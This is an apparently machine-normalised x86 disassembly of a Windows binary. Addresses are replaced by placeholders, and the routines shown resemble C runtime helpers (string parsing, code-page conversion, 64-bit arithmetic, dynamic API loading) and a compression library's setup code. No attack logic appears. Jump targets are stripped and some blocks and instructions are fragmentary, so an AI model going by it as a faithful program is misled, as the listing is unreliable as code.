push 0x18
pop eax
pop esi
retn
sub_40fdda
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ esp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ esp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_40fe1b
push 0x20
push r--data
call sub_40c6e8
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_40c246
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_40c72d
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40fdda
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40dad3
mov [ ebp - 0x1c ] 0x1
push eax
call sub_40c105
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_40e438
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e979
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40cdbd
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40c0fc
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ff8f
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40ffcb
push [ rw-data ]
call sub_40c105
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_40ffed
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_40c0fc
xor ebx ebx
cmp [ rw-data ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov eax [ rw-data ]
mov esi [ ebp - 0x10 ]
cmp eax esi
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ rw-data ]
call sub_40c105
pop ecx
call eax
push eax
call sub_40c105
pop ecx
call eax
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
push eax
call sub_40c105
pop ecx
call eax
cmp eax ebx
je r-xdata
push eax
call sub_40c099
mov [ esp ] rw-data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40c099
mov [ esp ] rw-data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40c099
mov [ rw-data ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_40d992
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40d9c9
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
push [ rw-data ]
call sub_40c105
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e87d
add esp 0x14
push [ ebp - 0x4 ]
push eax
call sub_40c105
pop ecx
call eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e87d
add esp 0x14
test [ ebp - 0x18 ] 0x1
jne r-xdata
push rw-data
push edi
call esi
push eax
call sub_40c099
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
or [ ebp + 0x10 ] 0x40000
jmp r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
push rw-data
push edi
call esi
push eax
call sub_40c099
pop ecx
mov [ rw-data ] eax
sub_41018b
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_40e438
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40e979
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop esi
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
sub_4101d1
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d3a6
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41024d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41023c
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40acd2
leave
retn
sub_410294
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
test eax eax
mov ebx [ MultiByteToWideChar@IAT ]
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40acd2
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_40acf0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
cmp esi 0xffffffff
mov [ ebp - 0x2c ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call sub_40e99d
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_40ddc3
cmp eax edi
pop ecx
je r-xdata
call sub_410210
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_40de90
mov esi eax
pop ecx
inc esi
cmp [ ebp - 0x2c ] edi
mov ebx [ WideCharToMultiByte@IAT ]
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_40d8d3
cmp eax edi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_40d805
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_410450
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4104f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_410524
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_40d3a6
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_40e438
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40e979
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_4107e1
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test cx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40e438
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov al [ ebp + 0x18 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_41074f
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_410524
add esp 0x14
pop ebp
retn
sub_410780
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4107e1
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40d3a6
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4101d1
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40f04d
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4108b0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_4108a0
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_410980
push ebx
push ebp
push esi
push edi
call sub_410b50
test eax eax
jne r-xdata
mov edi [ esp + 0x14 ]
xor ebp ebp
cmp edi ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffff7
pop ebx
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn 0x10
mov ebx [ esp + 0x18 ]
cmp ebx 0x1
jl r-xdata
cmp ebx 0x9
jg r-xdata
mov eax [ esp + 0x20 ]
cmp eax ebp
jl r-xdata
cmp eax 0xfa
jg r-xdata
cmp eax ebp
jne r-xdata
cmp [ edi + 0x24 ] ebp
jne r-xdata
mov [ esp + 0x20 ] 0x1e
cmp [ edi + 0x28 ] ebp
jne r-xdata
mov [ edi + 0x24 ] sub_410b60
mov eax [ edi + 0x2c ]
push 0x1
push 0xd9b0
push eax
call [ edi + 0x24 ]
mov esi eax
add esp 0xc
cmp esi ebp
jne r-xdata
mov [ edi + 0x28 ] sub_410b80
lea eax [ ebx + ebx * 4 ]
mov [ esi ] edi
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
lea eax [ eax + eax * 4 ]
mov [ esi + 0x18 ] ebp
mov edx [ edi + 0x2c ]
push 0x1
lea eax [ eax + eax * 4 ]
lea ebx [ eax + eax * 4 ]
lea ebx [ ebx + ebx * 4 ]
shl ebx 0x5
lea ecx [ ebx * 4 ]
push ecx
push edx
call [ edi + 0x24 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x2c ]
lea eax [ ebx * 4 + 0x88 ]
push 0x1
push eax
push ecx
call [ edi + 0x24 ]
mov [ esi + 0x14 ] eax
mov edx [ edi + 0x2c ]
push 0x1
push 0x40004
push edx
call [ edi + 0x24 ]
mov ecx [ esi + 0x10 ]
add esp 0x24
cmp ecx ebp
mov [ esi + 0x18 ] eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
retn 0x10
mov eax [ esi + 0x14 ]
cmp eax ebp
je r-xdata
mov edx [ esi + 0x14 ]
cmp edx ebp
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax ebp
je r-xdata
mov edx [ edi + 0x2c ]
push eax
push edx
call [ edi + 0x28 ]
add esp 0x8
cmp ecx ebp
je r-xdata
cmp eax ebp
je r-xdata
mov ecx [ edi + 0x2c ]
push esi
push ecx
call [ edi + 0x28 ]
add esp 0x8
mov eax 0xfffffffd
pop edi
pop esi
pop ebp
pop ebx
retn 0x10
push eax
mov eax [ edi + 0x2c ]
push eax
call [ edi + 0x28 ]
add esp 0x8
push ecx
mov ecx [ edi + 0x2c ]
push ecx
call [ edi + 0x28 ]
add esp 0x8
mov eax 0x2
add ebx 0xffffffed
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x18 ]
mov [ esi + 0x26c ] ebp
mov [ esi + 0x270 ] eax
mov eax [ esp + 0x1c ]
mov [ esi + 0x268 ] eax
mov eax [ esp + 0x20 ]
mov [ esi + 0x264 ] ebp
mov [ esi + 0x48 ] ebx
mov [ esi + 0x30 ] eax
mov [ esi + 0x24 ] edx
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebp
mov [ esi + 0x20 ] ecx
push esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x18 ] ebp
mov [ edi + 0x1c ] ebp
call sub_410bd0
push esi
call sub_410b90
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x10
sub_410b90
mov edx [ esp + 0x4 ]
push edi
xor eax eax
mov ecx 0x40
lea edi [ edx + 0x58 ]
mov [ edx + 0x44 ] eax
mov [ edx + 0x4c ] eax
mov [ edx + 0x50 ] eax
mov [ edx + 0x260 ] 0xffffffff
[ edi ]
mov eax [ edx + 0x26c ]
pop edi
inc eax
mov [ edx + 0x26c ] eax
retn
sub_410bf0
mov ecx [ esp + 0x4 ]
push esi
test ecx ecx
push edi
jne r-xdata
mov esi [ ecx + 0x20 ]
test esi esi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn 0x8
mov edi [ esi ]
cmp edi ecx
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn 0x8
mov eax [ esi + 0x4 ]
dec eax
cmp eax 0x3
ja r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn 0x8
pop edi
xor eax eax
pop esi
retn 0x8
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
cmp edx 0x1
je r-xdata
cmp edx 0x2
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x8
push ecx
call sub_410d90
add esp 0x4
neg al
sbb eax eax
pop edi
and eax 0x3
pop esi
add eax 0xfffffffe
retn 0x8
cmp edx 0x1
jne r-xdata
mov edx [ esi + 0xc ]
mov eax [ edi + 0x4 ]
cmp edx eax
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x8
mov edx [ esi + 0xc ]
mov eax [ edi + 0x4 ]
cmp edx eax
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x8
cmp edx 0x2
jne r-xdata
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] 0x3
mov [ esi + 0xc ] eax
jmp r-xdata
push ecx
call sub_410d90
mov eax [ esi + 0xc ]
add esp 0x4
test eax eax
ja r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x8
push ecx
call sub_410d90
add esp 0x4
test al al
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x8
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x4 ]
dec eax
cmp eax 0x3
jbe r-xdata
pop edi
mov eax 0x2
pop esi
retn 0x8
push esi
call sub_410d70
add esp 0x4
test al al
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
ja r-xdata
jmp [ eax * 4 + jump_table_410d5c ]
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x4c ]
cmp eax ecx
jl r-xdata
pop edi
mov eax 0x3
pop esi
retn 0x8
push esi
call sub_410d70
add esp 0x4
test al al
je r-xdata
mov [ esi + 0x4 ] 0x2
pop edi
mov eax 0x1
pop esi
retn 0x8
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x4c ]
cmp eax ecx
jl r-xdata
mov [ esi + 0x4 ] 0x1
pop edi
mov eax 0x4
pop esi
retn 0x8
sub_410d90
push ecx
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ eax + 0x20 ]
xor bl bl
push edi
mov [ esp + 0x13 ] bl
mov ebp 0x1
mov edi 0x2
cmp [ esi + 0x8 ] edi
jne r-xdata
push esi
call sub_4111d0
mov cl [ esp + 0x17 ]
add esp 0x4
or cl al
mov eax [ esi + 0x4c ]
mov [ esp + 0x13 ] cl
mov ecx [ esi + 0x50 ]
cmp ecx eax
jl r-xdata
cmp [ esi + 0x8 ] ebp
jne r-xdata
push esi
call sub_410fe0
or bl al
mov eax [ esi + 0x4 ]
add esp 0x4
cmp eax edi
je r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x4 ] 0x4
jne r-xdata
mov eax [ esi + 0x44 ]
mov ecx [ esi + 0x48 ]
cmp eax ecx
jl r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
mov al [ esp + 0x13 ]
test al al
jne r-xdata
push esi
call sub_410b90
mov eax [ esi + 0x4 ]
add esp 0x4
cmp eax 0x3
mov [ esi + 0x8 ] edi
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
push 0x0
push esi
call sub_4112e0
add esp 0x8
mov [ esi + 0x8 ] ebp
jmp r-xdata
push esi
call sub_410ea0
cmp [ esi + 0x4 ] 0x4
sete dl
push edx
push esi
call sub_4112e0
add esp 0xc
mov [ esi + 0x8 ] ebp
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push esi
call sub_410d70
add esp 0x4
test al al
jne r-xdata
push esi
call sub_410d70
add esp 0x4
test al al
jne r-xdata
sub_410ed0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov edi [ eax + 0x38 ]
mov cl [ eax + 0x34 ]
test edi edi
mov [ esp + 0x10 ] cl
jle r-xdata
